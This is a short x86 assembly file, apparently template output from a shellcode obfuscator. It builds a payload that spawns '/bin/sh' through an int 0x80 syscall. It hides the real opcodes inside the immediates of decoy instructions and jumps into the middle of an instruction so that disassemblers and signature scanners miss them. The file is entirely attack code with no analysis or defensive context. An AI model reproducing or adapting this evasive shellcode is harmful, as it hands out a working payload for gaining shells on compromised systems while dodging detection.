BITS 32
section .data
;ALLOCATE DATA HERE
;Don't forget data for memory access adjustment

	shellpath: db "/bin/sh",0
	shellpathlen: equ $-shellpath

	ediData: dd 1
	ecxData: dd 1
	eaxData: dd 1
	ebpData: dd 1

section .text
	global _start
_start:
;preface

;Change 0xdeadc0de to 'label - 1'
lea esi, [shellpath-1]

;Memory adjustment stuff (Change 0xdeadc0de to according memory access adjusment label)
lea edi, [ediData]
sub edi, 0x1c683ff
lea ecx, [ecxData]
sub ecx, 0xbb80c46
lea eax, [eaxData]
sub eax, 0x0
push ebp
lea ebp, [ebpData]
sub ebp, 0x84e8d1e

jmp mep0 + 0x3

;mep
mep0:
test dword [edi+0x1c683ff], 0x7689c031
or [ecx+0xbb80c46], cl
add [eax], al
add [ebp+0x84e8d1e], cl
lea edx, [esi+0xc]
int 0x80
pop ebp
mov eax, 1
mov ebx, 0
int 0x80
